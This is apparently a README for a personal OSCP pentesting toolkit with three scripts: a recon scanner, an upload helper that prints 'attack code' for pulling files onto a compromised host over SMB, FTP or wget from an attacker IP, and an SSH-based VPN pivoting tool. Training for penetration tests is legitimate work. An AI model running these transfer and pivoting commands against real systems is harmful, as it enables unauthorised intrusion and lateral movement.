# c0toolkit

Miscellaneous pentesting scripts I wrote as I was going through the OSCP
certification. I will continue to add scripts as I clean them up.

## Usage

Just drag the scripts to your PATH and install the dependencies. Calling each
script with no arguments will provide usage instructions. Here is a breakdown of
the scripts and their uses:

### sc0ut

General purpose "first engagement" scan. Tries to achieve a compromise between
speed and thoroughness. It starts with a lightweight "top ports" nmap scan so
you have something to do while waiting for the in-depth sweeps. It continues
with a full range unicornscan, then drills down on the open ports with NMAP.
Finally, it repeats the process for the UDP ports.

### c0up

Attack upload manager. Through various python dependencies, it helps upload
files to target hosts under a variety of protocols. Choose the upload protocol,
and c0up generates a quick script to copy-paste into the target shell.

Supports:
   * smb
   * ftp
   * http

Example (smb):
```
[c0rax](c0toolkit)> ./c0up -s test 
=========== MSDOS ATTACK CODE =========== 
copy \\10.11.0.14\c0up\test test
========================================= 

 Copy the attack code above to your target shell, then terminate this 
 script with CTRL-C to shut down the SMB server. 

 Starting smbserver instance... 
 * impacket-smbserver c0up test
```

Example (ftp):
```
[c0rax](test)> ./c0up -f 21 test
=========== MSDOS ATTACK CODE =========== 
echo open 192.168.1.66 21 > ftp.txt
echo USER iftp iftp>> ftp.txt
echo quote pasv>> ftp.txt
echo binary >> ftp.txt
echo GET test >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
========================================= 

=========== BASH ATTACK CODE ============ 
$ wget --user=iftp --password iftp ftp://192.168.1.66:21/test
========================================= 

 Copy the attack code above to your target shell, then terminate this 
 script with CTRL-C to shut down the web server. 

 Starting python ftp server instance... 
 * python -m pyftpdlib --port=21 -u iftp -P iftp -D
```

### c0lonize

Provided you have ssh root access to a remote linux host, c0lonize offers a
quick way to set up layer 3 tunneling, establishing a VPN over SSH and easily 
taking over an entire subnet. It's a noisy but very comfortable way to pivot,
which is very useful in engagements like the OSCP labs.

It has a big advantage over sshuttle and similar tools, in that you have control
over IP traffic. You can ping, SYN-scan and use all your tools directly, without
needing proxychains as an intermediary.
